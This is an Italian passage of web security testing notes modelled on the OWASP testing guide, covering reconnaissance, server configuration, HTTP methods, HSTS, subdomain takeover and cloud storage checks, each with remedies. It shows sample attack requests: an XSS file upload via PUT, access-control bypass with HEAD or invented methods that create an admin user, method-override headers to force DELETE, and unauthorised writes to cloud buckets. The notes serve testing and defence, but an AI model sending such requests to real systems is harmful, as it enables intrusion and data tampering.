        Encryption: https://www.linkedin.com/help/linkedin/answer/79676
        Canonical: https://www.linkedin.com/.well-known/security.txt
        Policy: https://www.linkedin.com/help/linkedin/answer/62924


* Molte applicazioni web che sono collegate ad un sito potrebbero essere difficili da raggiungere o accessibili solamente sapendo l’indirizzo ip o il dns corretto per accedere a quella pagina, devo quindi dare ai tester tutti I riferimenti alle pagine che voglio controllare, altrimenti potrebbero svolgere un lavoro non del tutto completo. Enumerare le applicazioni web che vengono eseguite su uno stesso server web: solitamente questo insieme di applicazioni web è specificato come un set di indirizzi IP o di nomi simbolici DNS (come per esempio google.com) è una buona pratica. Controllare l'esistenza di un'applicazione web in una porta on standard è semplice: con `Nmp` posso chiedere quali porta sono in funzione per un certo id, pr esempio col comando `nmap –Pn –sT –sV –p0-65535 192.168.1.100` da riga di comando posso sapere quali porte sono utilizzate e per cosa. Ci sono specificati altri modi per trovare o il dns dall’ip o contrario.
    
#### 5 - Esaminare il contenuto delle pagine web per verificare la presenza di perdite di informazioni
È comune per i programmatori includere commenti dettagliati e metadati nel codice sorgente, ma ciò può rivelare informazioni interne potenzialmente utili per attaccanti. La revisione dei commenti e dei metadati è cruciale per identificare eventuali perdite di informazioni. Sarebbe meglio togliere questo tipo di commenti prima di mandare in produzione l’applicazione. Per esempio è MOLTO sconsigliato scrivere così: `<!-- Use the DB administrator password for testing:  f@keP@a$$w0rD —>` come qualsiasi altro tipo di dato sensibile.

**Rimedio**
* Non scrivere dati sensibili come username o password o altri metadati nei commenti del codice sorgente

#### 6 - Identificare i punti di accesso dell'applicazione
Fondamentale è enumerare tutti i punti di accesso all’applicazione in questione.
I tester devono controllare anche le richieste attraverso i metodi get e post, controllando che i dati sensibili non vengano esplicitati durante la query. Nelle richieste post, per proteggere i parametri posso usare https, token di sessione, crittografia e altri metodi simili in modo che anche se una terza parte dovesse inteccettarli con un proxy, questi non sarebbero comunque visbili (verrà tutto spiegato in dettaglio in seguito). 
[OWASP Attack Surface Detector](https://github.com/secdec/attack-surface-detector-cli/releases) permette di trovare tutti gli endpoint di un sito (anche non raggiungibili dagli spider). Sono disponibili come plugin di ZAP e Burp Suite. 

#### 7 - Mappare i percorsi di esecuzione attraverso l'applicazione
Prima di iniziare i test di sicurezza, è fondamentale comprendere la struttura dell'applicazione. Senza una conoscenza approfondita del layout, è improbabile condurre un test esaustivo.Ci sono vari modi per essere sicuri di aver controllato tutto il codice:
* Testare ciascun percorso dell'applicazione, includendo analisi combinatorie e di valori limite per ogni punto decisionale. Questo metodo è completo, ma il numero di percorsi testabili cresce esponenzialmente.
* Testa l'assegnazione delle variabili tramite interazioni esterne, mappando il flusso e l'uso dei dati nell'applicazione.
* Testa istanze concorrenti dell'applicazione che manipolano gli stessi dati. (Date all'applicazione molti input in modo da farla etrare in uno stato di Race Condition e vedere come si comporta.)

Altri metodi più semplici e veloci possono essere quello di chiedere direttamente al creatore o al proprietario quali funzioni ha la sua app, oppure un sistema di spidering usando strumenti come ZAP.

#### 8 - Framework di fingerprinting per applicazioni web
La maggior parte dei siti o delle applicazioni web online è già stata ideata da qualcun altro, oppure è stata creata a partire da un framework. Per identificare questi casi, che aiutano a velocizzare il lavoro di conoscenza dell'architettura di una rete, si possono usare i seguenti metodi:
* **Header HTTP**: Il campo X-Powered-By è un indicatore comune.
* **Cookies**: Alcuni framework usano cookies specifici (tipo CakePHP).
* **Head del codice sorgente HTML**: Cercare pattern specifici nell'HTML.
* **File e Cartelle**: Ogni framework funziona con una certa struttura di file e cartelle, riconoscere un pattern può aiutare.
* **Estensioni di file**: Per esempio il .php, .aspx e .jsp.
* **Messaggi di errore**: ogni framework ha messaggi di errore specifici.

Per alcuni esempi specifici, controllare [questa pagina](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md).
Alcuni strumenti utili al fingerprinting (trovare alcune delle specifiche con cui sono costruiti i siti) sono [*WhatWeb*](https://morningstarsecurity.com/research/whatweb) e [*Wappalyzer*](https://www.wappalyzer.com/).

Usare strumenti come [mod_headers di Apache](https://httpd.apache.org/docs/current/mod/mod_headers.html) per nascondere parti dell'header di risposta che potrebbero mostrare all'attccante come è costruito il tuo backend: è consigliato nascondere la voce `Server`, `X-Powered-By` e ualsiasi informazionee dettagliata dui messaggi di errore.

**Rimedio**
* Usare strumenti come [mod_headers di Apache](https://httpd.apache.org/docs/current/mod/mod_headers.html) per nascondere parti dell'header di risposta che potrebbero mostrare all'attccante come è costruito il tuo backend: è consigliato nascondere la voce `Server`, `X-Powered-By` e ualsiasi informazionee dettagliata dui messaggi di errore.

#### 9 - Mappare l'architettura dell'applicazione
Oltre ai framework usati, è utile conoscere anche l'architettura con cui stiamo lavorando, in particolare se è su tutto situato su un unico o su multipli server e se sono usati più linguaggi o uno solo. Le componenti principali da tenere in considerazione sono:
* **Web Server**: Applicazioni semplici possono viaggiare su un singolo server, identiicabile come visto sopra (2).
* **Paas, Platform as a Service**: l'infrastruttura e il server su cui viaggia l'applicazione sono forniti dal service provider. In questo caso le uniche parti testabili sono quelle prettamente di codice e nessun altra. Talvolta è possibile che si stia usando un servizio del genere dal dominio (per esempio Azure App mette nei propri domini *.azurewebsites.net) ma non sempre è cosi, in altri casi non è semplice capirlo.
* **Senza server**: come il Paas risulta facile testare solamente il codice.
* **Microservizi**: in un architettura con Microservizi, invece di essere un applicazione monolitica, è formata da diversi servizi e potrebbe utilizzare svariati sistemi operativi e linguaggi
* **Storage statico**: contenuti che non varieranno possono essere memorizzati su piattaforme dedicate (come Amazon's S3 Buckets).
* **Database**: Le applicazioni web non banali usano qualche tipo di database per contenere i dati dinamici. Si possono individuare i database scannerizzando la porta  del server o provocando messaggi di errore appositamente. Se non è possibile in questo modo, si può in genere indovinare in base al sistema operativo utilizzato dalla macchina in questione (Windows, IIS and ASP.NET often use Microsoft SQL server, Embedded systems often use SQLite, PHP often uses MySQL or PostgreSQL, APEX often uses Oracle).
* **Autenticazione**: La maggior parte delle applicazioni usano l'autenticazione degli utenti, in base a come questa viene effettuata, si possono individuare diversi tipi di backend.

---

* **Reverse proxy**: Strumento che prende le richieste provenienti dal front end e le ridirige nella giusta direzione nel backend.
* **Load balancer**: in un servizio con più server, ridirige le richieste in arrivo verso il server più opportuno.
* **Content Delivery Network**: è un set di proxy designato ad aumentare la performance di un servizio, indirizzando diversi tipi di dati in diverse direzioni, un applicazione che si connette ad un cdn per esempio, se possiede dei dati statici come per esempio delle foto, le salverà sul suo server (cdn) privato in modo che la latenza nel rendere l'immagine all'utente sia inferiore a quanto sarebbe normalmente. I dati dinamici invece sono reindirizzati verso i server propri all'applicazione.

--- 

* **Network firewall**: La maggior parte dei server web è protetta da un firewall. Per verificarne la presenza, puoi effettuare una scansione delle porte del server e analizzare i risultati. Se la maggior parte delle porte risulta "chiusa" (ossia restituiscono un pacchetto RST in risposta al pacchetto SYN iniziale), ciò suggerisce che il server potrebbe non essere protetto da un firewall. Se invece le porte risultano "filtrate" (ossia non si riceve risposta inviando un pacchetto SYN a una porta non utilizzata), è probabile che sia presente un firewall. Inoltre, se servizi inappropriati sono esposti al pubblico (come SMTP, IMAP, MySQL, ecc.), ciò indica che o non c’è un firewall attivo, o che il firewall è configurato in modo errato. 
* **Sistema di Rilevamento e Prevenzione delle Intrusioni di Rete**: Un Sistema di Rilevamento delle Intrusioni (IDS) è progettato per rilevare attività sospette o malevole a livello di rete, come la scansione delle porte o delle vulnerabilità, e generare avvisi. Un Sistema di Prevenzione delle Intrusioni (IPS) funziona in modo simile, ma agisce anche per prevenire l’attività, solitamente bloccando l’indirizzo IP sorgente.
* **Firewall per Applicazioni Web**: Ispeziona il contenuto delle richieste HTTP e blocca quelle che sembrano sospette o malevole. Può anche applicare controlli dinamici come CAPTCHA o limitazioni di frequenza.

### B - Test sulla gestione della configurazione dell'implementazione
#### 1 - Test per la configurazione dell'infrastruttura network
Una corretta gestione della configurazione dell'infrastruttura dei server web è molto importante per preservare la sicurezza dell'applicazione stessa. Se elementi come il software del server web, i server di database backend o i server di autenticazione non vengono adeguatamente esaminati e messi in sicurezza, potrebbero introdurre rischi indesiderati o nuove vulnerabilità che potrebbero compromettere l'applicazione stessa.
Sfruttando i metodi visti sopra, è necessario: 
* Determinare i pezzi che compongono l'infrastruttura
* Esaminare i suoi elementi in cerca di falle nella sicurezza
* Rivedere i metodi di autenticazione
* Mantenere un elenco di porte necessarie e aggiornarlo ad ogni modifica

**Come testare vulnerabilità su Server Noti**
Revisionare le vulnerabilità dei server può essere difficile se il test deve essere effettuato attraverso un penetration test alla cieca. In questi casi, le vulnerabilità devono essere testate da un sito remoto, tipicamente utilizzando uno strumento automatizzato. Alcuni strumenti automatizzati segnaleranno vulnerabilità a seconda della versione del server web che rilevano. Ciò porta a falsi positivi e falsi negativi. 
 
Da un lato, se la versione del server web è stata rimossa o oscurata dall'amministratore del sito locale, lo strumento di scansione non segnalerà il server come vulnerabile, anche se lo è. Dall'altro lato, se il fornitore del software non aggiorna la versione del server web quando le vulnerabilità vengono risolte, lo strumento di scansione segnalerà vulnerabilità che non esistono. Nella maggior parte dei casi, la scansione delle vulnerabilità di un'architettura applicativa troverà solo le vulnerabilità associate agli "elementi esposti" dell'architettura (come il server web) e di solito non sarà in grado di trovare vulnerabilità associate a elementi che non sono direttamente esposti, come il backend di autenticazione, il database backend o i reverse proxy in uso. 
 
Infine, non tutti i fornitori di software divulgano pubblicamente le vulnerabilità, il che significa che queste debolezze potrebbero non essere registrate nei database di vulnerabilità noti. Queste informazioni vengono comunicate solo ai clienti o pubblicate tramite patch che non hanno avvisi associati. Ciò riduce l'efficacia degli strumenti di scansione delle vulnerabilità.  
 
Per questo motivo, la revisione delle vulnerabilità è meglio effettuata quando il tester ha accesso a informazioni interne sul software, comprese versioni, rilasci e patch applicate. 

**Strumenti amministrativi**
Qualsiasi infrastruttura di server web richiede l'esistenza di strumenti amministrativi per mantenere e aggiornare le informazioni utilizzate dall'applicazione. Queste informazioni includono contenuti statici (pagine web, file grafici), codice sorgente dell'applicazione, database di autenticazione degli utenti.
 
Dopo aver mappato le interfacce amministrative utilizzate per gestire diverse parti dell'architettura, è importante rivederle. Se un attaccante guadagna accesso a una di queste interfacce, potrebbe potenzialmente compromettere o danneggiare l'architettura dell'applicazione. Per raggiungere questo obiettivo, è importante:
* Determinare i meccanismi che controllano l'accesso a queste interfacce e le loro vulnerabilità associate. Queste informazioni possono essere disponibili online.
* Assicurarsi che il nome utente e la password predefiniti siano stati cambiati.

#### 2 - Test sulla configurazione della piattaforma di un'applicazione
Una corretta configurazione degli elementi che compongono un'architettura applicativa è importante per prevenire errori che potrebbero compromettere la sicurezza dell'intera architettura. Questo perché vari sistemi spesso vengono forniti con configurazioni generiche, che potrebbero non allinearsi bene con i compiti che devono svolgere nei siti specifici in cui sono installati, ciò che non è essenziale dovrebbe essere rimosso prima del deploy per evitare sfruttamenti post-installazione.

**Obiettivi di Test**:
* Assicurarsi che file predefiniti siano stati rimossi
* Contollare che non ci sia codice di debug o estensioni lasciate negli ambienti di produzione

*File directory noti*: gli scanner CGI servono proprio a controllare la presenza di questi file in modo veloce. Tuttavia, l'unico modo per essere davvero certi è fare una revisione completa del contenuto del server web o del server applicativo e determinare se sono correlati all'applicazione stessa o meno.
*Revisione dei commenti*: la revisione dei commenti dovrebbe essere eseguita per determinare se ci siano perdite di informazioni attraverso i commenti. Questa revisione può essere effettuata solo tramite un'analisi del contenuto statico e dinamico del server web e attraverso ricerche nei file.
*Revisione della configurazione*: In generale le linee guida di configurazione (fornite dal venditore del software o da parti esterne) dovrebbero essere seguite per determinare se il server è stato adeguatamente protetto.

Alcune linee guida buone sono le seguenti:
* Abilitare solo i moduli del server (estensioni ISAPI nel caso di IIS) necessari per l'applicazione dato che impedisce anche che vulnerabilità presenti nel software del fornitore possano influenzare il sito se sono presenti solo nei moduli già disabilitati.
* Gestire gli errori del server con pagine personalizzate invece che quelle predefinite del server (da fare alla fine dato che i programmatori necessitano di questi errori in ambienti di produzione)
* Assicurarsi che il software del server registri correttamente sia gli accessi legittimi che gli errori.
* Assicurarsi che il server riesca a gestire i sovracarichi e prevenire gli attacchi di Denial of Service.
* Non memorizzare informazioni sensibili in `NET Framework machine.config` e `root web.config`, se dovrebbero essere riservate solo agli amministratori: questi file sono accessibili da tutti gli utenti.
* Cifrare le informazioni sensibili.
* Dare il file `applicationHost.config` in sola lettura.
* Usare una password forte quando si esportano le chiavi di crittografia per l'uso con la configurazione condivisa.
* Mantenere accessi ristretti alla condivisione contenente la configurazione condivisa e le chiavi di crittografia.
* Considerare di proteggere questa condivisione con regole firewall e politiche IPsec per consentire solo ai server web membri di connettersi.

**Logging**
Alcune applicazioni potrebbero, ad esempio, utilizzare richieste GET per inoltrare dati da un modulo che possono essere visibili nei log del server. Ciò significa che i log del server potrebbero contenere informazioni sensibili (come nomi utente e password o dettagli di conti bancari). Queste informazioni sensibili possono essere sfruttate da un attaccante se ottiene i log, ad esempio, tramite interfacce amministrative o vulnerabilità note del server web o configurazioni errate.

Tipicamente, i server generano log locali delle loro azioni e errori, occupando spazio nel disco del sistema su cui è in esecuzione il server. Tuttavia, se il server viene compromesso, i suoi log possono essere cancellati dall'intruso per eliminare tutte le tracce del suo attacco e dei suoi metodi. In tal caso, l'amministratore di sistema non avrebbe conoscenza su come è avvenuto l'attacco o dove si trovava la fonte dell'attacco. Pertanto, è saggio mantenere i log in una posizione separata e non sul server web stesso.

Una memorizzazione impropria dei log può introdurre una condizione di Denial of Service. Se il server non è configurato correttamente, i file di log saranno memorizzati nella stessa partizione del disco utilizzata per il software del sistema operativo o per l'applicazione stessa. Ciò significa che se il disco si riempie, il sistema operativo o l'applicazione potrebbero fallire a causa dell'impossibilità di scrivere sul disco.Ciò non significa che i log debbano crescere fino a riempire il file system in cui si trovano. La crescita dei log del server dovrebbe essere monitorata per rilevare questa condizione, poiché potrebbe indicare un attacco.

La maggior parte dei server (ma poche applicazioni personalizzate) ruotano i log per evitare che riempiano il file system in cui si trovano. L'assunzione durante la rotazione dei log è che le informazioni al loro interno siano necessarie solo per una durata limitata. Alcuni server potrebbero ruotare i log quando raggiungono una dimensione specifica. Se ciò accade, deve essere garantito che un attaccante non possa forzare la rotazione dei log per nascondere le proprie tracce.

Le informazioni di log degli eventi non dovrebbero mai essere visibili agli utenti finali. Anche gli amministratori web non dovrebbero avere accesso a tali log, poiché ciò violerebbe i controlli di separazione dei doveri.

Per analizzare gli attacchi al server web, è necessario analizzare i file di log degli errori del server. La revisione dovrebbe concentrarsi su:
* Messaggi di errore 40x (non trovato). Un grande numero di questi provenienti dalla stessa sorgente potrebbe indicare l'uso di uno strumento scanner CGI contro il server web.
* Messaggi di errore 50x (errore del server). Questi possono essere un'indicazione che un attaccante sta abusando di parti dell'applicazione che falliscono inaspettatamente. Ad esempio, le prime fasi di un attacco SQL injection produrranno questi messaggi di errore quando la query SQL non è correttamente costruita e la sua esecuzione fallisce sul database di backend.

**Rimedi**
* Abilita solamente i file del server necessari: non rischiare di inserire vulnerabilità inutili.
* Gestisci gli errori con pagine personalizzate e non specifiche per non dare informazioni sul server.
* Assicurati che il server registri correttamente sia gli accessi legittimi che gli errori.
* Assicurati che il server riesca a gestire i sovraccarichi
* Non memorizzare informazioni sensibili in `NET Framework machine.config` e `root web.config`
* Cifrare le informazioni sensibili.
* Dare il file `applicationHost.config` in sola lettura.
* Usare una password forte quando si esportano le chiavi di crittografia.
* Mantenere accessi ristretti alla condivisione contenente la configurazione condivisa e le chiavi di crittografia.
* Considerare di proteggere questa condivisione con regole firewall e politiche IPsec per consentire solo ai server web membri di connettersi.
* Invia dati sensibili solamente con POST e non con GET
* Salva i log in un'area separata dal server web per prevenire la cancellazione o la compromissione
* Configura bene la rotazione dei log per evitare che i file occupino tutto lo spazio disponibile, mantenendo solo quelli necessari e rimuovere quelli obsoleti
* Limita l'accesso ai log solo al personale autorizzato
* Implementa un sistema di monitoraggio dei log per analizzare per esempio un numero insolitamente elevato di errori 40x o 50x di fila
* Anonimizza o maschera i dati sensibili nei log con tecniche di hashing per esempio
* Mantieni il server aggiornato per proteggere da vulnerabilità note
* Esegui backup regolari dei login modo da poterli analizzare anche in caso di compromissione del server

#### 3 - Test sulle estensini di file che potrebbero contenere informazioni sensibili
È fondamentale controllare i file che vengono resi noti al pubblico in cerca di informazioni sensibili, come tutti i file di testo sia compressi che non (.docx, .pdf, .zip, ecc...) ma soprattutto controllare che solamente i file giusti siano mandati in produzione e per esempio non i file .java.

**Rimedio**
* Controlla i file resi noti al pubblico in cerca di informazioni sensibili (come per esempio tutti i file di testo come `.docx pdf .zip`)

#### 4 - Esaminare i vecchi backup e i file non referenziati per verificare la presenza di informazioni sensibili
Così come i file distrattamente mandati in produzione, sono altrettanto problematici i vecchi file di backup e non referenziati: questi possibilmente contengono informazioni sensibili che non vengono eliminati pensando che non siano accessibili agli attaccanti. 
Gli attaccanti possono accedere a questi file dato che i file non referenziati possono rivelare informazioni sensibili che possono facilitare un attacco mirato all'applicazione. Per pagine non referenziate si intendono le pagine web che esistono sul server ma che non sono accessibili in alcun modo dall'aplicazione principalipale. Un attaccante può accedervi con tecniche di enumerazione, attraverso falle del server oppure passando dai motori di ricerca che potrebbero aver indicizzato tali pagine. Cancellare questi file o comunque togliere da essi le informazioni sensibili è sempre un buon metodo per evitare perdite di informazioni.

#### 5 - Identificare interfacce e funzionalità amministratore nascoste
**Black box testing**
* Enumerazione di directory e file: Un'interfaccia amministrativa può essere presente ma non visibilmente disponibile per il tester. In alcuni scenari, questi percorsi possono essere rivelati in pochi secondi utilizzando tecniche di ricerca avanzate su Google - [Google dorks](https://www.exploit-db.com/google-hacking-database).
* Molti siti utilizzano un codice comune che viene caricato per tutti gli utenti del sito. Esaminando tutto il codice sorgente inviato al client, si possono scoprire collegamenti alle funzionalità dell'amministratore, che devono essere analizzati.
* Se il server o l'applicazione sono distribuiti nella loro configurazione predefinita, potrebbe essere possibile accedere all'interfaccia di amministrazione utilizzando le informazioni descritte nella documentazione di configurazione o nella guida. Se si trova un'interfaccia amministrativa e sono necessarie delle credenziali, è necessario consultare gli elenchi di password predefinite.
* Usare port di accesso non predefinite (come per esempio la 8080) per interfacce da amministratore.

Una volta individuata un'interfaccia amministrativa, è possibile utilizzare una combinazione delle tecniche sopra descritte per tentare di aggirare l'autenticazione.
    
**Grey box testing**
È necessario effettuare un esame più dettagliato dei componenti del server e dell'applicazione per garantire l'indurimento (ad esempio, le pagine dell'amministratore non sono accessibili a tutti attraverso l'uso di filtri IP o altri controlli) e, se del caso, verificare che tutti i componenti non utilizzino credenziali o configurazioni predefinite.
Ogni framework web può avere le proprie pagine o percorsi di amministrazione predefiniti.
Uno degli strumenti più diffusi, usati per identificare interfacce amministrative nascoste è ZAP.
    
#### 6 - Test dei metodi HTTP
I metodi più diffusi per ottenere informazioni da un server web siano GET e POST, esistono anche altri metodi:

| Metodo  | Scopo Originale            | Scopo RESTful          |
|---------|-----------------------------|------------------------|
| GET     | Richiedere un file.        | Richiedere un oggetto. |
| HEAD    | Richiedere un file, ma restituire solo le intestazioni HTTP. |                        |
| POST    | Inviare dati.              |                        |
| PUT     | Caricare un file.          | Creare un oggetto.     |
| DELETE  | Cancellare un file.        | Cancellare un oggetto. |
| CONNECT | Stabilire una connessione a un altro sistema. |                        |
| OPTIONS | Elencare i metodi HTTP supportati. | Eseguire una richiesta di Preflight CORS. |
| TRACE   | Ecco la richiesta HTTP a scopo di debug. |                        |
| PATCH   |                             | Modificare un oggetto. |

Innanzitutto vanno scoperti per ogni applicazione web i metodi supportati, il modo più semplice è con una richiesta OPTION al server:

    OPTIONS / HTTP/1.1
    Host: example.org

    HTTP/1.1 200 OK
    Allow: OPTIONS, GET, HEAD, POST

Tuttavia, non tutti i server potrebbero rispondere alle richieste OPTIONS, e alcuni potrebbero anche restituire informazioni imprecise. Un modo più affidabile per testare i metodi supportati è semplicemente fare una richiesta con quel tipo di metodo e esaminare la risposta del server. Se il metodo non è consentito, il server dovrebbe restituire uno stato 405 Method Not Allowed.
Un modo più affidabile per testare i metodi supportati è semplicemente fare una richiesta con quel tipo di metodo e esaminare la risposta del server. Se il metodo non è consentito, il server dovrebbe restituire uno stato 405 Method Not Allowed. Questo può occasionalmente essere utile per eludere un firewall per applicazioni web o qualsiasi altro filtro che blocca metodi specifici.

Alcuni server web legacy consentivano l'uso del metodo PUT per creare file sul server. Ad esempio, se il server è configurato per consentirlo, la richiesta sottostante creerebbe un file sul server chiamato test.html con il contenuto `<script>alert(1)</script>`.

    PUT /test.html HTTP/1.1
    Host: example.org
    Content-Length: 25

    <script>alert(1)</script>

Richieste simili possono essere effettuate anche con cURL:

    curl https://example.org --upload-file test.html`

Questo consente a un aggressore di caricare file arbitrari sul server web, il che potrebbe potenzialmente comportare un compromesso completo del sistema se fosse consentito caricare codice eseguibile come file PHP. Tuttavia, questa configurazione è estremamente rara e improbabile da vedere sui sistemi moderni.

Allo stesso modo, il metodo DELETE può essere utilizzato per cancellare file dal server web.

    DELETE /test.html HTTP/1.1
    Host: example.org

o con cURL:

    curl http://example.org/test.html -X DELETE

Al contrario, i metodi PUT e DELETE sono comunemente utilizzati dalle moderne applicazioni *RESTful* per creare e cancellare oggetti.

Il metodo *CONNECT* consente al server web di aprire una connessione TCP a un altro sistema e poi passare il traffico dal client a quel sistema. Questo potrebbe consentire a un aggressore di fare proxy del traffico attraverso il server, per nascondere il proprio indirizzo sorgente, accedere a sistemi interni o accedere a servizi legati a localhost.

**Test per il Bypass di Controllo Accessi**
Se una pagina dell'applicazione reindirizza gli utenti a una pagina di accesso con un codice 302 quando tentano di accedervi direttamente, potrebbe essere possibile bypassare questo comportamento effettuando una richiesta con un metodo HTTP diverso, come HEAD, POST o anche un metodo inventato come FOO. Se l'applicazione web risponde con un HTTP/1.1 200 OK anziché l'atteso HTTP/1.1 302 Found, potrebbe quindi essere possibile bypassare l'autenticazione o l'autorizzazione. L'esempio seguente mostra come una richiesta HEAD potrebbe risultare in una pagina che imposta cookie amministrativi, anziché reindirizzare l'utente a una pagina di accesso:

    HEAD /admin/ HTTP/1.1
    Host: example.org

    HTTP/1.1 200 OK
    [...]
    Set-Cookie: adminSessionCookie=[...];

In alternativa, potrebbe essere possibile effettuare richieste dirette a pagine che causano azioni, come:

    HEAD /admin/createUser.php?username=foo&password=bar&role=admin HTTP/1.1
    Host: example.org

Oppure:

    FOO /admin/createUser.php
    Host: example.org
    Content-Length: 36

    username=foo&password=bar&role=admin

**Test per l'overriding dei metodi HTTP**
Alframeworks web forniscono un modo per sovrascrivere il metodo HTTP effettivo nella richiesta. Raggiungono questo obiettivo emulando i verbi HTTP mancanti e passando alcune intestazioni personalizzate nelle richieste. Lo scopo principale di questo è eludere un'applicazione middleware (come un proxy o un firewall per applicazioni web) che blocca metodi specifici. Le seguenti intestazioni HTTP alternative potrebbero essere utilizzate:
* X-HTTP-Method
* X-HTTP-Method-Override
* X-Method-Override   

Per testare questo, considera scenari in cui verbi ristretti come PUT o DELETE restituiscono un 405 Method Not Allowed. In tali casi, ripeti la stessa richiesta, ma aggiungi le intestazioni alternative per l'overriding del metodo HTTP. Quindi, osserva la risposta del sistema. L'applicazione dovrebbe rispondere con un codice di stato diverso (ad esempio, 200 OK) nei casi in cui l'overriding del metodo è supportato.

Il server web nell'esempio seguente non consente il metodo DELETE e lo blocca:

    DELETE /resource.html HTTP/1.1
    Host: example.org

    HTTP/1.1 405 Method Not Allowed
    [...]

Dopo aver aggiunto l'intestazione X-HTTP-Method, il server risponde alla richiesta con un 200:
    
    GET /resource.html HTTP/1.1
    Host: example.org
    X-HTTP-Method: DELETE

    HTTP/1.1 200 OK
    [...]

Quindi ricordiamo di assicurarsi che siano disponibili al pubblico solamente i metodi richiesti dall'applicazione e che non siano implementati workaround per eludere la sicurezza da parte per esempio di admin, framework o server web.

**Rimedio**
* Configura il server per consentire solo i metodi HTTP necessari (non lasciare per esempio PUT se non serve)

#### 7 - Controllare la funzionalità HTTP Strict transport Security
La funzionalità HTTP Strict Transport Security (HSTS) consente a un server web di informare il browser dell'utente, tramite un'intestazione di risposta speciale, che non dovrebbe mai stabilire una connessione HTTP non crittografata ai server del dominio specificato. Invece, dovrebbe automaticamente effettuare tutte le richieste di connessione per accedere al sito tramite HTTPS.

L'intestazione HTTP Strict Transport Security utilizza tre direttive specifiche:
* max-age: la direttiva max-age in HSTS indica per quanto tempo, in secondi, il browser deve memorizzare l'informazione che deve connettersi al sito solo tramite HTTPS. Per esempio max-age: 31536000 indica che questa impossibilità di connessione attraverso HTTP deve durare un anno.
* includeSubDomains: per indicare che tutti i sottodomini correlati devono utilizzare HTTPS.
* preload Unofficial: per indicare che il/i dominio/i sono presenti nelle liste di preload e che i browser non dovrebbero mai connettersi senza HTTPS.

**Come testare**
* Usare un proxy di intercettazione ed analizzarne la risposta
* Usare il seguente comando curl:
    
        $ curl -s -D- https://owasp.org | grep -i strict-transport-security:
        Strict-Transport-Security: max-age=31536000

**Rimedio**
* Utilizza sempre le connessioni HTTPS e non HTTP

#### 8 - Permessi dei file di test
Quando una risorsa viene impostata con permessi che consentono l'accesso a un numero maggiore di attori rispetto a quanto necessario, ciò potrebbe portare all'esposizione di informazioni sensibili o alla modifica di quella risorsa da parte di soggetti non autorizzati. 

**Come testare**
In Linux, utilizzare il comando ls per controllare i permessi dei file. In alternativa, è possibile utilizzare `namei` per elencare ricorsivamente i permessi dei file usandolo in questo modo:

    $ namei -l /PathToCheck/

#### 9 - Test per il Takeover di Sottodomini
Un record DNS che punta a una risorsa non esistente è una vulnerabilità. Gli attaccanti possono approfittare di questo per prendere il controllo del sottodominio, soprattutto nell'era dei servizi cloud, dove è facile che le risorse vengano abbandonate o disattivate.
Se il takeover del sottodominio ha successo, è possibile una vasta gamma di attacchi (servire contenuti malevoli, phishing, rubare cookie di sessione, credenziali, ecc.).
In termini di gravità dell'attacco, un takeover di sottodominio NS (anche se meno probabile) ha l'impatto più alto, poiché un attacco riuscito potrebbe comportare il controllo completo dell'intera zona DNS e del dominio della vittima.

**Come testare**
**Black box**
Il primo passo è enumerare i server DNS e i record delle risorse della vittima. Ci sono diversi modi per completare questo compito; ad esempio, l'enumerazione DNS utilizzando un elenco di dizionari di sottodomini comuni, brute force DNS o utilizzando motori di ricerca web e altre fonti di dati OSINT come per esempio con OWASP Amass - enumerazione DNS.

Utilizzando il comando dig, il tester cerca i seguenti messaggi di risposta del server DNS che richiedono ulteriori indagini:
* NXDOMAIN
* SERVERFAIL
* REFUSED
* nessun server raggiungibile

Identificare quali record di risorse DNS sono inattivi e puntano a servizi non utilizzati. Utilizzando il comando dig per il record CNAME:

    $ dig CNAME fictioussubdomain.victim.com
    ; <<>> DiG 9.10.3-P4-Ubuntu <<>> ns victim.com
    ;; opzioni globali: +cmd
    ;; Risposta ricevuta:
    ;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 42950
    ;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

Le seguenti risposte DNS richiedono ulteriori indagini: NXDOMAIN.
Per testare il record A, il tester esegue una ricerca nel database whois e identifica GitHub come fornitore di servizi:

    $ whois 192.30.252.153 | grep "OrgName"
    OrgName: GitHub, Inc.

Il tester visita `subdomain.victim.com` o emette una richiesta HTTP GET che restituisce una risposta `404 - File non trovato`, un chiaro indicatore della vulnerabilità.

Identificare tutti i nameserver per il dominio in questione:

    $ dig ns victim.com +short
    ns1.victim.com
    nameserver.expireddomain.com

In questo esempio fittizio, il tester verifica se il dominio `expireddomain.com` è attivo con una ricerca presso un registrar di domini. Se il dominio è disponibile per l'acquisto, il sottodominio è vulnerabile.

Per mitigare il rischio di takeover del sottodominio, i record di risorse DNS vulnerabili dovrebbero essere rimossi dalla zona DNS. Monitoraggio continuo e controlli periodici sono raccomandati come prassi migliore.

**Rimedi**
* Assicurarsi di rimuovere DNS che puntano a risorse non più attive o necessarie
* Utilizzare servizi di monitoraggio che avvisano quando un dominio o un sottodominio scade o viene modificato

#### 10 - Test Cloud Storage
Una configurazione errata del controllo degli accessi al Cloud può portare all'esposizione di informazioni sensibili, manomissione dei dati o accesso non autorizzato.

**Come testare**
Innanzitutto, identifica l'URL per accedere ai dati nel servizio di archiviazione.
Puoi utilizzare curl per i test con i seguenti comandi e verificare se le azioni non autorizzate possono essere eseguite con successo.

    curl -X GET https://<cloud-storage-service>/<object>

    curl -X PUT -d 'test' 'https://<cloud-storage-service>/test.txt'

Nel comando sopra, è consigliabile sostituire le virgolette singole (') con virgolette doppie (") quando esegui il comando su una macchina Windows.

Per esempi specifici nel caso di Amazon S3 Bucket guarda [qui](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md).

#### 11 - Testing for Content Security Policy
La Content Security Policy (CSP) è una politica di whitelist dichiarativa applicata tramite l'intestazione di risposta Content-Security-Policy o un elemento `<meta>` equivalente. Consente agli sviluppatori di limitare le fonti da cui vengono caricati risorse come JavaScript, CSS, immagini, file, ecc. La CSP è una tecnica efficace di difesa in profondità per mitigare il rischio di vulnerabilità come il Cross Site Scripting (XSS) e il Clickjacking.

**Come testare**
Per testare le configurazioni errate nelle CSP, cerca configurazioni insicure esaminando l'intestazione HTTP Content-Security-Policy o l'elemento meta CSP in uno strumento proxy:
* La direttiva unsafe-inline consente script o stili inline, rendendo le applicazioni suscettibili ad attacchi XSS.
